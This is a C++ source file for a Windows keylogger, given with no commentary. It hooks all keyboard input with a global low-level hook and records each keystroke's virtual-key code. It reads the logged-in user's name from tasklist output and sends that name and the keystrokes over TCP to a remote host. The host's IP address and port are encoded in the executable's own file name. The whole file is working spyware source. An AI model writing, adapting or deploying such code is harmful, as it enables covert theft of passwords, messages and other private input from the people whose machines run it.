#include <iostream>
#include <conio.h>
#include <windows.h>
#include <winsock.h>
#include <vector>
#include <queue>

#pragma comment(lib, "Ws2_32.lib")

HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;
SOCKET s;
SOCKADDR_IN sin1;
char code[6];
char name[100];
std::queue<std::string> q;


DWORD WINAPI sending(PVOID p)
{
	while (true)
	{
		while (q.size())
		{
			if (send(s, &q.front()[0], 6, 0) != 6)
			{
				closesocket(s);
				socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
				int c = connect(s, (struct sockaddr*) & sin1, sizeof(struct sockaddr));

				if (!c)
				{
					send(s, name, 100, 0);
					send(s, &q.front()[0], 6, 0);
					q.pop();
				}
			}
			else
				q.pop();
		}
		Sleep(1000);
	}
	return 0;
}

void GetName(char* UserName)
{
	setlocale(LC_ALL, "Russian");

	FILE* fp = _popen("tasklist /v /FI \"IMAGENAME eq explorer.exe\" /FO \"list\"", "r");

	if (fp) {
		std::vector<char> buffer(4096);
		std::size_t n = fread(buffer.data(), 1, buffer.size(), fp);
		int i = 0;
		int cur = 0;
		while (buffer[i] != '\\') ++i;

		while (buffer[++i] != '\n' && i < buffer.size())
			UserName[cur++] = buffer[i];
		UserName[cur] = '\0';
		_pclose(fp);
	}
}

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		if (wParam == WM_KEYDOWN)
		{
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			sprintf_s(code, "%d", kbdStruct.vkCode);
			q.push(code);
		}
	}

	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

int main(int argc, char* argv[])
{
	WSADATA WsaData;

	int port = 0;
	char chport[5];
	char ip[20];
	int i = 0;

	for (; i < 4; ++i)
		chport[i] = argv[0][i];
	sscanf_s(chport, "%d", &port);
	--port;
	int k = 0;
	while (argv[0][i])
	{
		ip[k] = argv[0][i];
		++k; ++i;
	}
	ip[k] = '\0';

	GetName(name);

	WSAStartup(0x0101, &WsaData);
	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sin1.sin_family = AF_INET;
	sin1.sin_port = htons(port);
	sin1.sin_addr.S_un.S_addr = inet_addr(ip);

	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{

	}

	HANDLE h = CreateThread(NULL, 0, sending, &s, 0, NULL);

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{

	}

	// UnhookWindowsHookEx(_hook);
}